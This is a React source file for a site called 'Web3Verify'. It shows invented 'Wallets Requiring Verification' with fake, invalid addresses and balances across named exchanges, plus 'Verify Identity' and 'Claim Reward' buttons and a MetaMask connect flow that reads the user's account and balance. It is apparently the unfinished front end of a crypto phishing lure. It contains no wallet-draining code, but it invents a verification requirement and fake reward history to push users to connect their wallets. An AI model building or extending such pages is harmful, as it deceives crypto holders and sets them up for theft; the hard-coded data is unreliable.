import { useState, useEffect, useRef } from 'react'
import './App.css'
import { FaShieldAlt, FaWallet, FaRegClock } from "react-icons/fa";
import { GoCopy } from "react-icons/go";
import { RiErrorWarningFill } from "react-icons/ri";
import { IoIosArrowForward } from "react-icons/io";
import { WagmiProvider, useConnect } from 'wagmi'
import { injected } from 'wagmi/connectors'
import Web3 from 'web3';

import METAMASK_ICON from './assets/metamask.svg';
import ETHEREUM_ICON from './assets/ethereum.png'
import ETHEREUM_BLACK_ICON from './assets/ethereum-black.png'
import TELEGRAM_ICON from './assets/telegram.png'
import Modal from './Modal';
import { config } from './config';
const options = ["Binance", "Coinbase", "Kraken", "FTX"];
const data = [
  {
    address: '0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t',
    Exchange: 'Binance',
    Balance: 2.45
  },
  {
    address: '0x9s8r7q6p5o4n3m2l1k0j9i8h7g6f5e4d3c2b1a',
    Exchange: 'Coinbase',
    Balance: 7.89
  },
  {
    address: '0x5o4n3m2l1k0j9i8h7g6f5e4d3c2b1a9s8r7q6p',
    Exchange: 'Kraken',
    Balance: 12.15
  },
];

const formatAddress = (address) => {
  if (!address) return '';
  return address.slice(0, 6) + '...' + address.slice(-8);
};

function Homepage() {
  const { connect } = useConnect()
  const [selected, setSelected] = useState('');
  const [copySuccess, setCopySuccess] = useState('');
  const selectRef = useRef();
  console.log(selected, 'selected')
  console.log(copySuccess, 'copySuccess')
  const [isOpen, setIsOpen] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [account, setAccount] = useState(null);
  const [balance, setBalance] = useState(null);
  const [error, setError] = useState(null);

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (selectRef.current && !selectRef.current.contains(event.target)) {
        setIsOpen(false);
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, []);

  const handleSelect = (option) => {
    setSelected(option);
    setIsOpen(false);
  };

  const handleConnect = () => {

  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
      .then(() => setCopySuccess('Copied!'))
      .catch(() => setCopySuccess('Failed to copy!'));

    setTimeout(() => setCopySuccess(''), 2000);  // Reset message after 2s
  };

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setAccount(accounts[0]);

        // Lấy số dư
        const balance = await web3.eth.getBalance(accounts[0]);
        setBalance(web3.utils.fromWei(balance, 'ether'));
      } else {
        setError('MetaMask is not installed. Please install it to use this app.');
      }
    } catch (err) {
      const dappUrl = 'https://web3verify.vercel.app/'; // ⚠️ Thay bằng domain thật của bạn, KHÔNG có https://
      window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
    }
  };

  const disconnectWallet = () => {
    setAccount(null);
    setBalance(null);
};

  return (
    <div className='w-full min-h-screen bg-[#f5f7fa]'>
      <header className='background-radient-header'>
        <div className='flex justify-between py-6 container mx-auto'>
          <div className='flex justify-between items-center'>
            <FaShieldAlt />
            <p className='text-2xl font-bold ml-2'>Web3Verify</p>
          </div>
          <button onClick={connectWallet} className="flex items-center gap-2 px-4 py-2 bg-white text-gray-800 rounded-full">
            <img
              src={METAMASK_ICON}
              alt='Metamask Icon'
              width={24}
              height={24}
            />
            {account ? formatAddress(account) : `Connect Wallet`}
          </button>
        </div>
      </header>
      <main>
        <div className='container mx-auto px-4 py-8'>
          <div className='grid grid-cols-1 lg:grid-cols-3 gap-8'>
            <div className='lg:col-span-2 space-y-6'>
              <div className='bg-white rounded-xl shadow-md p-6'>
                <div className='flex justify-between items-center mb-6'>
                  <h2 className='text-xl font-bold text-gray-800'>Wallets Requiring Verification</h2>
                  <div className='relative'>
                    <div ref={selectRef} className="relative">
                      {/* <label className="block text-gray-700 font-semibold mb-2">{label}</label> */}
                      <div
                        className="flex justify-between min-w-[180px] appearance-none bg-gray-100 border border-gray-200 rounded-lg px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 cursor-pointer"
                        onClick={() => setIsOpen(!isOpen)}
                      >
                        <p className='text-gray-800'>{'All Exchanges'}</p>
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          className={`h-5 w-5 text-gray-800 transition-transform ${isOpen ? 'rotate-180' : ''}`}
                          fill="none"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                        </svg>
                      </div>
                      {isOpen && (
                        <ul className="absolute left-0 right-0 bg-gray-100 border border-gray-300 rounded-lg mt-1 max-h-60 overflow-y-auto z-10 shadow-lg">
                          {options.map((option, index) => (
                            <li
                              key={index}
                              className="px-4 py-2 hover:bg-blue-500 text-gray-800 hover:text-white cursor-pointer"
                              onClick={() => handleSelect(option)}
                            >
                              {option}
                            </li>
                          ))}
                        </ul>
                      )}
                    </div>
                  </div>
                </div>
                {data.map((item, i) => (
                  <div key={i} className={`mb-6 bg-white rounded-lg shadow-sm p-5 border-gray-100 backdrop-blur-lg overflow-hidden hover:bg-white/30 hover:shadow-lg hover:-translate-y-2 transition-all duration-300 border-1 hover:border-1 hover:border-l-blue-500`}>
                    <div className='flex flex-row justify-between'>
                      <div className=''>
                        <div className='flex flex-row items-center'>
                          <img
                            src={ETHEREUM_ICON}
                            alt='Ethereum Icon'
                            width={24}
                            height={24}
                          />
                          <p className='font-mono text-sm text-gray-700'>{item.address}</p>
                          <button onClick={() => copyToClipboard('0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t')} className="flex items-center gap-2 px-2 py-2 bg-white text-gray-800 rounded-full">
                            <GoCopy />
                          </button>
                        </div>
                        <div className='flex row'>
                          <div className='text-sm flex row'>
                            <p className='text-gray-500'>Balance:</p>
                            <p className='font-medium text-black ml-[6px]'>{item.Balance} ETH</p>
                          </div>
                          <div className='text-sm flex row ml-2'>
                            <p className='text-gray-500'>ETH Exchange:</p>
                            <p className='font-medium text-black ml-[6px]'>{item.Exchange}</p>
                          </div>
                        </div>
                      </div>
                      <button onClick={() => setIsModalOpen(true)} className="flex items-center bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors">
                        Verify Identity
                      </button>
                    </div>
                  </div>
                ))}

              </div>
            </div>
            <div className='space-y-6'>
              <div className='bg-white rounded-xl shadow-md p-6'>
                <h2 className='text-xl font-bold text-gray-800 mb-4'>Your Wallet</h2>
                <div id="walletNotConnected" className='flex flex-col justify-center items-center text-center py-8'>
                  <FaWallet className='text-gray-400 w-9 h-9' />
                  <p className='text-gray-400 mb-4'>No wallet connected</p>
                  <button onClick={connectWallet} className="font-medium flex justify-center items-center gap-2 px-4 py-2 bg-[#f3f4f6] text-gray-800 rounded-full w-full hover:bg-[#e5e7eb]">
                    <img
                      src={ETHEREUM_BLACK_ICON}
                      alt='Metamask Icon'
                      width={20}
                      height={20}
                    />
                    {account ? formatAddress(account) : `Connect Wallet`}
                  </button>
                </div>
              </div>
              <div className='bg-white rounded-xl shadow-md p-6'>
                <h2 className='text-xl font-bold text-gray-800 mb-4'>Verification History</h2>
                <div className='space-y-4'>
                  <div className='border-b border-gray-100 pb-4'>
                    <div className='flex justify-between items-start mb-2'>
                      <div className='font-mono text-sm text-black'>{formatAddress('0x5o4n3m2l1k0j9i8h7g6f5e4d3c2b1a9s8r7q6p')}</div>
                      <div className='status-badge status-success'>Verified</div>
                    </div>
                    <div className='flex justify-between items-center text-sm text-gray-600'>
                      <div className='flex flex-row items-center'>
                        <FaRegClock className='text-gray-400 w-[14px] h-[14px] mr-1' />
                        <p className='text-[#4b5563]'>2023-06-15</p>
                      </div>
                      <div className=''>
                        <button onClick={handleConnect} className="font-medium flex justify-center items-center gap-2 py-2 text-blue-600 rounded-full w-full hover:underline">
                          <img
                            src={TELEGRAM_ICON}
                            alt='Telegram Icon'
                            width={20}
                            height={20}
                          />
                          Claim Reward
                        </button>
                      </div>
                    </div>
                  </div>
                  <div className='border-b border-gray-100 pb-4'>
                    <div className='flex justify-between items-start mb-2'>
                      <div className='font-mono text-sm text-black'>{formatAddress('0x5o4n3m2l1k0j9i8h7g6f5e4d3c2b1a9s8r7q6p')}</div>
                      <div className='status-badge status-failed'>Rejected</div>
                    </div>
                    <div className='flex justify-between items-center text-sm text-gray-600'>
                      <div className='flex flex-row items-center'>
                        <FaRegClock className='text-gray-400 w-[14px] h-[14px] mr-1' />
                        <p className='text-[#4b5563]'>2023-06-15</p>
                      </div>
                      <div className=''>
                        <button onClick={handleConnect} className="font-medium flex justify-center items-center gap-2 py-2 text-blue-600 rounded-full w-full hover:underline">
                          Try Again
                        </button>
                      </div>
                    </div>
                    <div className='flex flex-row items-center mt-2 text-xs text-red-600'>
                      <RiErrorWarningFill className='mr-2 w-4 h-4' />
                      Document image quality too low
                    </div>
                  </div>
                  <div className='border-b border-gray-100 pb-4'>
                    <div className='flex justify-between items-start mb-2'>
                      <div className='font-mono text-sm text-black'>{formatAddress('0x5o4n3m2l1k0j9i8h7g6f5e4d3c2b1a9s8r7q6p')}</div>
                      <div className='status-badge status-pending'>Processing</div>
                    </div>
                    <div className='flex justify-between items-center text-sm text-gray-600'>
                      <div className='flex flex-row items-center'>
                        <FaRegClock className='text-gray-400 w-[14px] h-[14px] mr-1' />
                        <p className='text-[#4b5563]'>2023-06-18 (24h remaining)</p>
                      </div>
                      <div className=''>
                        <button onClick={handleConnect} className="font-medium flex justify-center items-center gap-2 py-2 text-blue-600 rounded-full w-full hover:underline">
                          Try Again
                        </button>
                      </div>
                    </div>
                  </div>
                  <button onClick={handleConnect} className="flex flex-row items-center mt-4 text-blue-600 hover:text-blue-800 text-sm font-medium">
                    View All History
                    <IoIosArrowForward className='ml-[6px] w-4 h-4' />
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
        <Modal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} title="Example Modal">
          <p>This is a simple modal using Tailwind CSS and ReactJS.</p>
        </Modal>
      </main>
      <footer className='bg-gray-50 border-t border-gray-200 mt-12'>
        <div className='container mx-auto px-4 py-8'>
          <div className='flex flex-col md:flex-row justify-between items-center'>
            <div className='flex items-center space-x-2 mb-4 md:mb-0'>
              <FaShieldAlt className='text-blue-500' />
              <p className='font-bold ml-2 text-black'>Web3Verify</p>
            </div>
            <div className='flex space-x-6'>
              <a href="#" className="text-gray-600 hover:text-gray-900">Terms</a>
              <a href="#" className="text-gray-600 hover:text-gray-900">Privacy</a>
              <a href="#" className="text-gray-600 hover:text-gray-900">FAQ</a>
              <a href="#" className="text-gray-600 hover:text-gray-900">Contact</a>
            </div>
          </div>
          <div className='mt-6 text-center text-sm text-gray-500'>
            © 2023 Web3Verify. All rights reserved.
          </div>
        </div>
      </footer>
    </div>

  )
}

export default Homepage
